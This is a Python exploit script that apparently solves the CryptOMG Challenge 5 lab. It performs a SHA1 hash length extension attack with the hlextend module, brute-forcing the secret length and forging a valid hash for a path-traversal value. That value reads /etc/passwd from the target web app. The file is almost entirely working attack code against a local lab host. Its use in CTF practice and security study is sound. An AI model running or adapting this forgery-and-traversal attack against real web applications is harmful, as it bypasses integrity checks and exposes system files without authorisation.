#!/usr/bin/env python
# Brute forcing script to solve CryptOMG Challenge 5 using hlextend Hash Length Extension Python module
from urllib.parse import quote
import requests
import socket
import sys
import time
from html.parser import HTMLParser
import hlextend


site ='http://192.168.56.101:8083/ctf/challenge5/index.php' 
hashAlg = 'sha1'
startHash = 'dd03bd22af3a4a0253a66621bcb80631556b100e'
fileName = 'test'

appendData = '../../../../../../../../../../../../../../etc/passwd'
params = { 'algo' : hashAlg }

cookies = { 'PHPSESSID' : 'gs6mfb7t83jn77nbehcs8rmgi3' }  
proxies = { 'http' : 'http://127.0.0.1:8080',  'https' : 'https://127.0.0.1:8080' } 

try:
    proxies
except:
    proxies = {}

try:
    cookies
except:
    cookies = {}

reqsettings = { 'proxies' : proxies, 'stream' : False, 'timeout' : 5, 'verify' : False, 'cookies' : cookies }

class HParser(HTMLParser):
    '''HTML parser to extract from div:content and h1 tags'''

    def __init__(self):
        HTMLParser.__init__(self)
        global inHtag
        global inDtag
        self.outData = ''
        self.divData = ''
        inHtag = False
        inDtag = False


    def handle_starttag(self, tag, attrs):
        global inHtag
        global inDtag

        if tag == 'h1':
            inHtag = True
        elif tag == 'div':
            if (self.get_starttag_text().find('content') > -1):
                inDtag = True
    
    def handle_endtag(self, tag):
        global inHtag
        global inDtag

        if tag == "h1":
            inHtag = False
        elif tag == "div":
            inDtag = False

    def handle_data(self, data):
        global inHtag
        global inDtag

        if inHtag:
            self.outData = self.outData + data
            #self.outData.append(data)
        elif inDtag:
            self.divData = self.divData + data
            

    def close(self):
        return [ self.outData, self.divData ]

sessions = requests.Session()

for length in range(3, 60):
    sha = hlextend.new(hashAlg)
    append = sha.extend(appendData, fileName, length, startHash, raw=True)
    newHash = sha.hexdigest()

    params['file'] = append
    params['hash'] = newHash
    reqsettings['params'] = params

    while 1:
        try:
            response = sessions.get(site, **reqsettings)
            break
        except (socket.error, requests.exceptions.RequestException):
            time.sleep(1)
            continue

    parser = HParser()
    parser.feed(response.text)
    [ out, divdata ] = parser.close()
    
    noResult = False
    
    if out.find('File not found') > -1:
        noResult = True

    if not noResult:
        print ('Length of secret: ' +  str(length))
        print ('Parameter value for file: ' +  quote(append))
        print ('Parameter value for hash: ' + newHash)
        print ('File contents: ')
        print (divdata[6:])
        sys.exit(0)